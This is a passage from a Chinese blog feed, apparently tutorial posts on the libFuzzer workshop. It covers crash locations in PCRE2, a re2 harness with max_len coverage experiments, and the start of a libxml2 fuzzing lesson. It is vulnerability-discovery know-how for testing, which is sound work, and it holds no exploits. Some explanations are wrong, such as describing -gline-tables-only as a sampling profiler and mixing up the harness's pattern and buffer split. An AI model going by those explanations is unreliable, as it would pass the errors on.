class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (start == end)</span><br><span class="line">      &#123;</span><br><span class="line">      *uchardata++ = XCL_SINGLE;</span><br><span class="line">      uchardata += PRIV(ord2utf)(start, uchardata);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>PRIV</code>定义在<code>pcre2_ord2utf.c</code>中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">PRIV</span><span class="params">(ord2utf)</span><span class="params">(<span class="type">uint32_t</span> cvalue, PCRE2_UCHAR *buffer)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* Convert to UTF-8 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> PCRE2_CODE_UNIT_WIDTH == 8</span></span><br><span class="line"><span class="keyword">register</span> <span class="type">int</span> i, j;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; PRIV(utf8_table1_size); i++)</span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">int</span>)cvalue &lt;= PRIV(utf8_table1)[i]) <span class="keyword">break</span>;</span><br><span class="line">buffer += i;</span><br><span class="line"><span class="keyword">for</span> (j = i; j &gt; <span class="number">0</span>; j--)</span><br><span class="line"> &#123;</span><br><span class="line"> *buffer-- = <span class="number">0x80</span> | (cvalue &amp; <span class="number">0x3f</span>);  <span class="comment">//此处对于内存指针循环操作由于限制条件不当导致出现了heap_overflow</span></span><br><span class="line"> cvalue &gt;&gt;= <span class="number">6</span>;</span><br><span class="line"> &#125;</span><br><span class="line">*buffer = PRIV(utf8_table2)[i] | cvalue;</span><br><span class="line"><span class="keyword">return</span> i + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Convert to UTF-16 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> PCRE2_CODE_UNIT_WIDTH == 16</span></span><br><span class="line"><span class="keyword">if</span> (cvalue &lt;= <span class="number">0xffff</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  *buffer = (PCRE2_UCHAR)cvalue;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">cvalue -= <span class="number">0x10000</span>;</span><br><span class="line">*buffer++ = <span class="number">0xd800</span> | (cvalue &gt;&gt; <span class="number">10</span>);</span><br><span class="line">*buffer = <span class="number">0xdc00</span> | (cvalue &amp; <span class="number">0x3ff</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Convert to UTF-32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">*buffer = (PCRE2_UCHAR)cvalue;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结下这两个crash：<br>第一个crash由harness中的<code>regexech</code>函数的匹配逻辑触发<code>stack_overflow</code>，位于<code>pcre2_match.c:5968:11</code>；第二个crash由<code>regcomp</code>函数的编译逻辑触发<code>heap_overflow</code>，位于<code>pcre2_ord2utf.c:92:12</code>。<br>一层层的函数调用关系分析得让人头大，但这也正体现了漏洞挖掘中的“挖掘”二字的含义。</p><h4 id="fuzzing-re2"><a href="#fuzzing-re2" class="headerlink" title="fuzzing re2"></a>fuzzing re2</h4><p>这一个例子将让我们意识到<code>max_len</code>的选择对于fuzz效率的影响。<br>re2是一个高效的、原则性的正则表达式库。是由两位来在Google的大神用C++实现的。Go中的regexp正则表达式包也是由re2实现的。workshop提供的是re2-2014-12-09的版本。<br>先源码编译：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar xzf re2.tgz</span><br><span class="line">cd re2</span><br><span class="line">export FUZZ_CXXFLAGS=&quot;-O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope&quot;</span><br><span class="line">make clean</span><br><span class="line">CXX=clang++ CXXFLAGS=&quot;$FUZZ_CXXFLAGS&quot;  make -j</span><br></pre></td></tr></table></figure><p>接着研究harness：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copyright (c) 2016 The Chromium Authors. All rights reserved.</span></span><br><span class="line"><span class="comment">// Use of this source code is governed by a BSD-style license that can be</span></span><br><span class="line"><span class="comment">// found in the LICENSE file.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;re2/re2.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;util/logging.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">using <span class="built_in">std</span>::<span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Test</span><span class="params">(<span class="type">const</span> <span class="built_in">string</span>&amp; buffer, <span class="type">const</span> <span class="built_in">string</span>&amp; pattern,</span></span><br><span class="line"><span class="params">          <span class="type">const</span> RE2::Options&amp; options)</span> &#123;</span><br><span class="line">  RE2 <span class="title function_">re</span><span class="params">(pattern, options)</span>;</span><br><span class="line">  <span class="keyword">if</span> (!re.ok())</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">string</span> m1, m2;</span><br><span class="line">  <span class="type">int</span> i1, i2;</span><br><span class="line">  <span class="type">double</span> d1;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (re.NumberOfCapturingGroups() == <span class="number">0</span>) &#123;</span><br><span class="line">    RE2::FullMatch(buffer, re);</span><br><span class="line">    RE2::PartialMatch(buffer, re);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (re.NumberOfCapturingGroups() == <span class="number">1</span>) &#123;</span><br><span class="line">    RE2::FullMatch(buffer, re, &amp;m1);</span><br><span class="line">    RE2::PartialMatch(buffer, re, &amp;i1);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (re.NumberOfCapturingGroups() == <span class="number">2</span>) &#123;</span><br><span class="line">    RE2::FullMatch(buffer, re, &amp;i1, &amp;i2);</span><br><span class="line">    RE2::PartialMatch(buffer, re, &amp;m1, &amp;m2);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  re2::StringPiece <span class="title function_">input</span><span class="params">(buffer)</span>;</span><br><span class="line">  RE2::Consume(&amp;input, re, &amp;m1);</span><br><span class="line">  RE2::FindAndConsume(&amp;input, re, &amp;d1);</span><br><span class="line">  <span class="built_in">string</span> <span class="title function_">tmp1</span><span class="params">(buffer)</span>;</span><br><span class="line">  RE2::Replace(&amp;tmp1, re, <span class="string">&quot;zz&quot;</span>);</span><br><span class="line">  <span class="built_in">string</span> <span class="title function_">tmp2</span><span class="params">(buffer)</span>;</span><br><span class="line">  RE2::GlobalReplace(&amp;tmp2, re, <span class="string">&quot;xx&quot;</span>);</span><br><span class="line">  RE2::QuoteMeta(re2::StringPiece(pattern));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Entry point for LibFuzzer.</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (size &lt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  RE2::Options options;</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> options_randomizer = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">    options_randomizer += data[i];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (options_randomizer &amp; <span class="number">1</span>)</span><br><span class="line">    options.set_encoding(RE2::Options::EncodingLatin1);</span><br><span class="line"></span><br><span class="line">  options.set_posix_syntax(options_randomizer &amp; <span class="number">2</span>);</span><br><span class="line">  options.set_longest_match(options_randomizer &amp; <span class="number">4</span>);</span><br><span class="line">  options.set_literal(options_randomizer &amp; <span class="number">8</span>);</span><br><span class="line">  options.set_never_nl(options_randomizer &amp; <span class="number">16</span>);</span><br><span class="line">  options.set_dot_nl(options_randomizer &amp; <span class="number">32</span>);</span><br><span class="line">  options.set_never_capture(options_randomizer &amp; <span class="number">64</span>);</span><br><span class="line">  options.set_case_sensitive(options_randomizer &amp; <span class="number">128</span>);</span><br><span class="line">  options.set_perl_classes(options_randomizer &amp; <span class="number">256</span>);</span><br><span class="line">  options.set_word_boundary(options_randomizer &amp; <span class="number">512</span>);</span><br><span class="line">  options.set_one_line(options_randomizer &amp; <span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">  options.set_log_errors(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span>* data_input = reinterpret_cast&lt;<span class="type">const</span> <span class="type">char</span>*&gt;(data);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">string</span> <span class="title function_">pattern</span><span class="params">(data_input, size)</span>;</span><br><span class="line">    <span class="built_in">string</span> <span class="title function_">buffer</span><span class="params">(data_input, size)</span>;</span><br><span class="line">    Test(buffer, pattern, options);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (size &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="built_in">string</span> <span class="title function_">pattern</span><span class="params">(data_input, size / <span class="number">3</span>)</span>;</span><br><span class="line">    <span class="built_in">string</span> <span class="title function_">buffer</span><span class="params">(data_input + size / <span class="number">3</span>, size - size / <span class="number">3</span>)</span>;</span><br><span class="line">    Test(buffer, pattern, options);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到harness用到了很多re2里的方法，最后使用FullMatch和PartialMatch接口进行匹配buffer和re。其中buffer是由<code>data_input</code>和<code>size</code>初始化得到（data_input由输入的data经无关类型转换得到），re是由pattern和options建立的RE2对象。<br>注意到harness里有几个条件分支语句，首先是size&lt;1是直接返回，还有就是当size&gt;&#x3D;3时，初始化pattn和buffer用的是size&#x2F;3和size-size&#x2F;3说明它对我们的输入的size进行了切割，初始化pattern用到的是<code>data_input + size / 3</code>，而初始化buffer是用的之后的data_input。这样使得我们样例的size会对fuzz的过程产生影响。如果size很短，可能无法触发crash，而如果size很大，对harness的执行匹配过程就会更加耗时，影响fuzz寻找覆盖点的效率。下面做几个测试，比较一下max_len对fuzz过程的影响：<br>编译链接harness：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang++ -O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope -std=gnu++98 target.cc -I re2/ re2/obj/libre2.a -fsanitize=fuzzer -o re2_fuzzer</span><br></pre></td></tr></table></figure><p>由于使用的re2版本较老了，编译的时候使用了c++98标准。</p><p>首先我们设置max_len为10，执行时间为100秒,-print_final_stats&#x3D;1打印最后的结果，corpus1作为语料库的存放处：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  10 git:(master) ✗ ./re2_fuzzer ./corpus1 -print_final_stats=1 -max_len=10 -max_total_time=100</span><br><span class="line"></span><br><span class="line">Done 643760 runs in 101 second(s)</span><br><span class="line">stat::number_of_executed_units: 643760</span><br><span class="line">stat::average_exec_per_sec:     6373</span><br><span class="line">stat::new_units_added:          36</span><br><span class="line">stat::slowest_unit_time_sec:    0</span><br><span class="line">stat::peak_rss_mb:              456</span><br></pre></td></tr></table></figure><p>只探测到了36个代码单元。<br>接着设置max_len为100，执行时间为100秒,-print_final_stats&#x3D;1打印最后的结果，corpus2作为语料库的存放处：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./re2_fuzzer ./corpus2 -print_final_stats=1 -max_len=100 -max_total_time=100</span><br><span class="line">Done 233437 runs in 101 second(s)</span><br><span class="line"></span><br><span class="line">stat::number_of_executed_units: 233437</span><br><span class="line">stat::average_exec_per_sec:     2311</span><br><span class="line">stat::new_units_added:          50</span><br><span class="line">stat::slowest_unit_time_sec:    0</span><br><span class="line">stat::peak_rss_mb:              675</span><br></pre></td></tr></table></figure><p>探测到了50个代码单元,感觉差别不大。<br>然年设置max_len为1000，执行时间为100秒,-print_final_stats&#x3D;1打印最后的结果，corpus3作为语料库的存放处：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./re2_fuzzer ./corpus3 -print_final_stats=1 -max_len=1000 -max_total_time=100</span><br><span class="line"></span><br><span class="line">Done 105935 runs in 101 second(s)</span><br><span class="line">stat::number_of_executed_units: 105935</span><br><span class="line">stat::average_exec_per_sec:     1048</span><br><span class="line">stat::new_units_added:          97</span><br><span class="line">stat::slowest_unit_time_sec:    0</span><br><span class="line">stat::peak_rss_mb:              830</span><br></pre></td></tr></table></figure><p>这次探测到了97个代码单元，是第二个的2倍，第一个的3倍左右。<br>最后再设置max_len为500，执行时间为100秒,-print_final_stats&#x3D;1打印最后的结果，corpus4作为语料库的存放处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./re2_fuzzer ./corpus4 -print_final_stats=1 -max_len=500 -max_total_time=100</span><br><span class="line"></span><br><span class="line">Done 119361 runs in 101 second(s)</span><br><span class="line">stat::number_of_executed_units: 119361</span><br><span class="line">stat::average_exec_per_sec:     1181</span><br><span class="line">stat::new_units_added:          117</span><br><span class="line">stat::slowest_unit_time_sec:    0</span><br><span class="line">stat::peak_rss_mb:              827</span><br></pre></td></tr></table></figure><p>结果也比较明显，不同的max_len对fuzz的效率有着不同的影响，当然这也和你写的harness有关。因此在执行fuzzer的时候选择合适的max_len(如本例中的max_len在100~1000比较合适)会使得我们fuzzer探测到更多的代码块，得到crash的效率也就越大。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>libfuzzer workshop到此就全部学习完了。libfuzzer作为最常用的fuzz工具，它所涉及到的一些使用方法在workshop里都有相应的lesson。就我个人而言，在逐步学习libfuzzer的过程中感觉到libfuzzer对于开源库提供的接口函数的fuzz是十分强力的，而这也是我们在学习libfuzzer中的难点:如何能够设计出合理的harness，这需要我们对要fuzz的开源库提供的方法有一定的了解，经过攻击面分析等去逐步改善我们的harness，使得我们与获得crash更近一步。</p><p>初学libfuzzer，有错误疏忽之处烦请各位师傅指正。</p>]]></content>
      
      
      
        <tags>
            
            <tag> FUZZ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（转）LibFuzzer workshop学习之路（二）</title>
      <link href="/2020/12/22/libfuzzer(2)/"/>
      <url>/2020/12/22/libfuzzer(2)/</url>
      
        <content type="html"><![CDATA[<p>文章首发于安全客，由安全客原创发布： <a href="https://www.anquanke.com/post/id/225957">https://www.anquanke.com/post/id/225957</a></p><h3 id="LibFuzzer-workshop学习之路（二）"><a href="#LibFuzzer-workshop学习之路（二）" class="headerlink" title="LibFuzzer workshop学习之路（二）"></a>LibFuzzer workshop学习之路（二）</h3><blockquote><p>上一篇对libfuzzer的原理和使用有了基本的了解，接下来就到进阶的内容了，会涉及到字典的使用，语料库精简，错误报告生成以及一些关键的编译选项的选择等内容，希望能对libfuzzer有更深入的学习。</p></blockquote><span id="more"></span><h4 id="lesson-08-dictionaries-are-so-effective"><a href="#lesson-08-dictionaries-are-so-effective" class="headerlink" title="lesson 08(dictionaries are so effective)"></a>lesson 08(dictionaries are so effective)</h4><p>对libxml2进行fuzz。<br>首先对其解压并用clang编译之。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tar xzf libxml2.tgz</span><br><span class="line">cd libxml2</span><br><span class="line"></span><br><span class="line">./autogen.sh</span><br><span class="line">export FUZZ_CXXFLAGS=&quot;-O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link&quot;</span><br><span class="line">CXX=&quot;clang++ $FUZZ_CXXFLAGS&quot; CC=&quot;clang $FUZZ_CXXFLAGS&quot; \</span><br><span class="line">    CCLD=&quot;clang++ $FUZZ_CXXFLAGS&quot;  ./configure</span><br><span class="line">make -j$(nproc)</span><br></pre></td></tr></table></figure><p>解释下新的编译选项<br><code>-gline-tables-only</code>:表示使用采样分析器<br>clang手册中对采样分析器的解释:<code>Sampling profilers are used to collect runtime information, such as hardware counters, while your application executes. They are typically very efficient and do not incur a large runtime overhead. The sample data collected by the profiler can be used during compilation to determine what the most executed areas of the code are.</code><br>用于收集程序执行期间的信息比如硬件计数器，在编译期间使用采样分析器所收集的数据来确定代码中最值得执行的区域。因此，使用样本分析器中的数据需要对程序的构建方式进行一些更改。在编译器可以使用分析信息之前，代码需要在分析器下执行。这也对提高我们fuzz效率很重要。<br>提供的harness：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copyright 2015 The Chromium Authors. All rights reserved.</span></span><br><span class="line"><span class="comment">// Use of this source code is governed by a BSD-style license that can be</span></span><br><span class="line"><span class="comment">// found in the LICENSE file.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;libxml/parser.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ignore</span> <span class="params">(<span class="type">void</span>* ctx, <span class="type">const</span> <span class="type">char</span>* msg, ...)</span> &#123;</span><br><span class="line">  <span class="comment">// Error handler to avoid spam of error messages from libxml parser.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">  xmlSetGenericErrorFunc(<span class="literal">NULL</span>, &amp;ignore);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">auto</span> doc = xmlReadMemory(reinterpret_cast&lt;<span class="type">const</span> <span class="type">char</span>*&gt;(data),</span><br><span class="line">                               static_cast&lt;<span class="type">int</span>&gt;(size), <span class="string">&quot;noname.xml&quot;</span>, <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">    xmlFreeDoc(doc);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将输入的样本类型转换后交给<code>xmlReadMemory</code>处理。编译如下：<br><code>clang++ -O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -std=c++11 xml_read_memory_fuzzer.cc -I libxml2/include libxml2/.libs/libxml2.a -fsanitize=fuzzer -lz -o libxml2-v2.9.2-fsanitize_fuzzer1</code></p><p>由于编译时使用了样本分析器，fuzz的执行速率和覆盖率都很可观</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">2481433</span>NEW    cov: <span class="number">2018</span> ft: <span class="number">9895</span> corp: <span class="number">3523</span>/<span class="number">671</span>Kb lim: <span class="number">1470</span> exec/s: <span class="number">2038</span> rss: <span class="number">553</span>Mb L: <span class="number">484</span>/<span class="number">1470</span> MS: <span class="number">1</span> CopyPart-</span><br><span class="line">#<span class="number">2481939</span>REDUCE cov: <span class="number">2018</span> ft: <span class="number">9895</span> corp: <span class="number">3523</span>/<span class="number">671</span>Kb lim: <span class="number">1470</span> exec/s: <span class="number">2037</span> rss: <span class="number">553</span>Mb L: <span class="number">390</span>/<span class="number">1470</span> MS: <span class="number">4</span> InsertByte-ChangeBit-ShuffleBytes-EraseBytes-</span><br><span class="line">#<span class="number">2482177</span>REDUCE cov: <span class="number">2018</span> ft: <span class="number">9895</span> corp: <span class="number">3523</span>/<span class="number">671</span>Kb lim: <span class="number">1470</span> exec/s: <span class="number">2037</span> rss: <span class="number">553</span>Mb L: <span class="number">816</span>/<span class="number">1470</span> MS: <span class="number">3</span> ChangeBit-ShuffleBytes-EraseBytes-</span><br><span class="line">#<span class="number">2482341</span>REDUCE cov: <span class="number">2018</span> ft: <span class="number">9895</span> corp: <span class="number">3523</span>/<span class="number">671</span>Kb lim: <span class="number">1470</span> exec/s: <span class="number">2038</span> rss: <span class="number">553</span>Mb L: <span class="number">41</span>/<span class="number">1470</span> MS: <span class="number">2</span> CopyPart-EraseBytes-</span><br><span class="line">#<span class="number">2482513</span>REDUCE cov: <span class="number">2018</span> ft: <span class="number">9896</span> corp: <span class="number">3524</span>/<span class="number">671</span>Kb lim: <span class="number">1470</span> exec/s: <span class="number">2038</span> rss: <span class="number">553</span>Mb L: <span class="number">604</span>/<span class="number">1470</span> MS: <span class="number">3</span> ChangeASCIIInt-ChangeASCIIInt-CopyPart-</span><br><span class="line">#<span class="number">2482756</span>REDUCE cov: <span class="number">2018</span> ft: <span class="number">9896</span> corp: <span class="number">3524</span>/<span class="number">671</span>Kb lim: <span class="number">1470</span> exec/s: <span class="number">2038</span> rss: <span class="number">553</span>Mb L: <span class="number">342</span>/<span class="number">1470</span> MS: <span class="number">2</span> InsertRepeatedBytes-EraseBytes-</span><br><span class="line">#<span class="number">2483073</span>REDUCE cov: <span class="number">2018</span> ft: <span class="number">9896</span> corp: <span class="number">3524</span>/<span class="number">671</span>Kb lim: <span class="number">1470</span> exec/s: <span class="number">2038</span> rss: <span class="number">553</span>Mb L: <span class="number">1188</span>/<span class="number">1470</span> MS: <span class="number">3</span> InsertByte-ShuffleBytes-EraseBytes-</span><br><span class="line">#<span class="number">2483808</span>REDUCE cov: <span class="number">2018</span> ft: <span class="number">9896</span> corp: <span class="number">3524</span>/<span class="number">671</span>Kb lim: <span class="number">1470</span> exec/s: <span class="number">2037</span> rss: <span class="number">553</span>Mb L: <span class="number">102</span>/<span class="number">1470</span> MS: <span class="number">2</span> InsertRepeatedBytes-EraseBytes-</span><br><span class="line">#<span class="number">2483824</span>REDUCE cov: <span class="number">2018</span> ft: <span class="number">9896</span> corp: <span class="number">3524</span>/<span class="number">671</span>Kb lim: <span class="number">1470</span> exec/s: <span class="number">2037</span> rss: <span class="number">553</span>Mb L: <span class="number">477</span>/<span class="number">1470</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">2483875</span>REDUCE cov: <span class="number">2018</span> ft: <span class="number">9896</span> corp: <span class="number">3524</span>/<span class="number">671</span>Kb lim: <span class="number">1470</span> exec/s: <span class="number">2037</span> rss: <span class="number">553</span>Mb L: <span class="number">70</span>/<span class="number">1470</span> MS: <span class="number">3</span> CopyPart-ChangeByte-EraseBytes-</span><br><span class="line">#<span class="number">2483999</span>REDUCE cov: <span class="number">2018</span> ft: <span class="number">9896</span> corp: <span class="number">3524</span>/<span class="number">671</span>Kb lim: <span class="number">1470</span> exec/s: <span class="number">2037</span> rss: <span class="number">553</span>Mb L: <span class="number">604</span>/<span class="number">1470</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">2485065</span>REDUCE cov: <span class="number">2018</span> ft: <span class="number">9896</span> corp: <span class="number">3524</span>/<span class="number">671</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2036</span> rss: <span class="number">553</span>Mb L: <span class="number">32</span>/<span class="number">1470</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">2485100</span>REDUCE cov: <span 